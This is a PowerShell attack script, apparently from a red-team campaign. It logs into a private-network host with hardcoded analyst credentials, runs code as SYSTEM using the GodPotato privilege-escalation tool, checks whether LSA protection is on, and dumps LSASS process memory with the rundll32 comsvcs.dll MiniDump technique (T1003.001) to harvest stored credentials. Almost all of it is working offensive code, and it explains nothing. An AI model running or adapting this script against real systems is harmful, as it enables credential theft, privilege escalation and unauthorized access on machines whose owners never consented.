[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Server = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$Username = "analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",
    [Parameter(Mandatory=$false)]
    [string]$GpPath = "C:\Windows\Temp\cadre-tools\GodPotato.exe"
)
$ErrorActionPreference = "Stop"

$script = @"
`$ErrorActionPreference = 'Continue'
# Check LSA protection (PPL) state
`$ppl = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
`$ppl2 = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name RunAsPPLBoot -ErrorAction SilentlyContinue).RunAsPPLBoot
Write-Output "PPL_RunAsPPL=`$ppl PPL_RunAsPPLBoot=`$ppl2"

# comsvcs.dll MiniDump fallback (T1003.001) — requires SeDebugPrivilege (SYSTEM has it)
`$lsass = Get-Process -Name lsass -ErrorAction SilentlyContinue
Write-Output "LSASS_PID `$(`$lsass.Id)"
`$dump = 'C:\Windows\Temp\cadre-lsass.dmp'
Start-Process -FilePath 'C:\Windows\System32\rundll32.exe' -ArgumentList "C:\Windows\System32\comsvcs.dll, MiniDump `$(`$lsass.Id) `$dump full" -Wait -NoNewWindow
Start-Sleep -Seconds 3
if (Test-Path `$dump) {
    `$f = Get-Item `$dump
    Write-Output "LSASS_DUMP_PATH `$(`$f.FullName)|`$(`$f.Length)"
} else {
    Write-Output 'LSASS_DUMP_NONE'
}
"@

& "$PSScriptRoot\campaign-a-t043-system-exec.ps1" -Server $Server -Username $Username -Password $Password -GpPath $GpPath -ScriptBlock $script
